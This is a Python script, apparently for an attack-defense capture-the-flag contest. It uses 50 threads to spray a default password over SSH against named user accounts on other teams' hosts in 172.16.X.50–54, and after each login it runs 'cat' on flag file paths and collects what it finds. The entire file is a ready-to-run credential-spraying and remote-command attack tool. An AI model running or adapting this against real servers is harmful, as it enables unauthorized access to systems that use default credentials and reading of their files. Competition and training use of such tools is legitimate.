#!/usr/bin/env python3
import paramiko
import threading
from queue import Queue

DEFAULT_PASS = "CHANGEME"   # plug in default creds here

MY_TEAM = 15
TEAMS = [t for t in range(1, 21) if t != MY_TEAM]

HOST_USERS = {
    50: ["crazydave","penny","greenshadow","solarflare","nightcap","wallknight","captaincombustible","citron","Administrator"],
    51: ["Administrator","jalapeno","coffeebean","pepperpult"],
    52: ["user","lilypad","fumeshroom","dandelion","banana","root"],
    53: ["user","spikeweed","root"],
    54: ["user","tanglekelp","hypnoshroom","root"],
}

FLAG_PATHS = ["/root/flag.txt", "/user/flag.txt", "C:\\Windows\\flag.txt"]

results = []
results_lock = threading.Lock()
q = Queue()

def try_ssh(ip, user, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(ip, port=22, username=user, password=password, timeout=5, banner_timeout=5)
        flags_found = []
        for path in FLAG_PATHS:
            try:
                _, stdout, _ = client.exec_command(f"cat {path} 2>/dev/null", timeout=5)
                data = stdout.read().decode().strip()
                if data:
                    flags_found.append((path, data))
            except:
                pass
        client.close()
        return flags_found
    except paramiko.AuthenticationException:
        print(f"[-] bad creds:   {ip} ({user})")
        return None
    except ConnectionRefusedError:
        print(f"[x] port closed: {ip}")
        return None
    except TimeoutError:
        print(f"[x] timeout:     {ip}")
        return None
    except Exception as e:
        print(f"[x] error:       {ip} ({user}) — {e}")
        return None
    finally:
        client.close()

def worker():
    while True:
        item = q.get()
        if item is None:
            break
        ip, octet, user = item
        flags = try_ssh(ip, user, DEFAULT_PASS)
        if flags is not None:
            with results_lock:
                if flags:
                    for path, flag in flags:
                        print(f"[FLAG] {ip} ({user}) {path} → {flag}")
                        results.append({"ip": ip, "user": user, "path": path, "flag": flag})
                else:
                    print(f"[+] login ok, no flags: {ip} ({user})")
        q.task_done()

NUM_THREADS = 50
threads = []
for _ in range(NUM_THREADS):
    t = threading.Thread(target=worker, daemon=True)
    t.start()
    threads.append(t)

for team in TEAMS:
    for octet, users in HOST_USERS.items():
        ip = f"172.16.{team}.{octet}"
        for user in users:
            q.put((ip, octet, user))

q.join()

for _ in threads:
    q.put(None)
for t in threads:
    t.join()

print(f"\n=== done — {len(results)} flags found ===")
for r in results:
    print(f"  {r['ip']} | {r['user']} | {r['flag']}")
